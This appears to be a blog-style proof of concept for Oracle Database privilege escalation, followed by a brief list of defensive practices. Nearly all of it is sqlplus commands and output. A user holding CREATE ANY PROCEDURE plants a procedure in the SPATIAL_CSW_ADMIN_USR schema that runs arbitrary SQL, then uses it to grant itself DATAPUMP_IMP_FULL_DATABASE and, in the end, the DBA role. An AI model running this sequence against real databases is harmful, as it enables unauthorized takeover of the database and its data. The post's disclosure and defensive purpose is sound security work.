-- 检测是否安装对应的组件
SQL> select comp_name from dba_registry;


-- Proof of Concept (PoC)


    -- I will create an account called ironman using SYS account,
    -- the account will be granted “create session” to connect to the database
    -- and “create any procedure”, and “execute any procedure” permissions:

sqlplus / as sysdba

SQL> create user ironman identified by iron_123;

SQL> grant create session to ironman;

SQL> grant create any procedure to ironman;


SQL> grant execute any procedure to ironman;

SQL> exit;

// I will now connect using the newly created account “ironman” using sql plus

sqlplus ironman/iron_123

SQL> show user

    USER is “IRONMAN”

    SQL> select * from session_roles;

no rows selected

SQL> create or replace  procedure  SPATIAL_CSW_ADMIN_USR.hulk  (SQL_TEXT  IN  VARCHAR2) as

BEGIN

EXECUTE IMMEDIATE (SQL_TEXT);

END hulk;
/


SQL> execute SPATIAL_CSW_ADMIN_USR.hulk('grant DATAPUMP_IMP_FULL_DATABASE to ironman');


SQL> select * from session_roles;

no rows selected

SQL> set role DATAPUMP_IMP_FULL_DATABASE;

// ironman account is escalated to the role DATAPUMP_IMP_FULL_DATABASE

SQL> select * from session_roles;

ROLE

——————————————————————————–

DATAPUMP_IMP_FULL_DATABASE

EXP_FULL_DATABASE

SELECT_CATALOG_ROLE

HS_ADMIN_SELECT_ROLE

HS_ADMIN_ROLE

HS_ADMIN_EXECUTE_ROLE

EXECUTE_CATALOG_ROLE

IMP_FULL_DATABASE

8 rows selected.

// the next escalation level is to DBA role !!

SQL> grant dba to ironman;

SQL> set role dba;

SQL> select * from session_roles;

ROLE

——————————————————————————–

DBA

SELECT_CATALOG_ROLE

HS_ADMIN_SELECT_ROLE

HS_ADMIN_ROLE

HS_ADMIN_EXECUTE_ROLE

EXECUTE_CATALOG_ROLE

DELETE_CATALOG_ROLE

EXP_FULL_DATABASE

Advertisements
Report this ad

IMP_FULL_DATABASE

DATAPUMP_EXP_FULL_DATABASE

DATAPUMP_IMP_FULL_DATABASE

ROLE

——————————————————————————–

GATHER_SYSTEM_STATISTICS

SCHEDULER_ADMIN

XDBADMIN

XDB_SET_INVOKER

JAVA_ADMIN

JAVA_DEPLOY

WM_ADMIN_ROLE

CAPTURE_ADMIN

OPTIMIZER_PROCESSING_RATE

EM_EXPRESS_ALL

EM_EXPRESS_BASIC

22 rows selected.

--- Conclusion:

The account ironman has been successfully elevated  to the “DBA” role which is the highest database role in Oracle database system.


*****************************************
- Defensive Techniques:

configure auditing to catch any privilege escalation attempts.
review database account permissions on regular basis.
ensure database accounts have strong passwords, and rotate passwords regularly if possible.
perform VA (vulnerability assesment) scans on regular basis.
pro-actively patch your systems and database systems.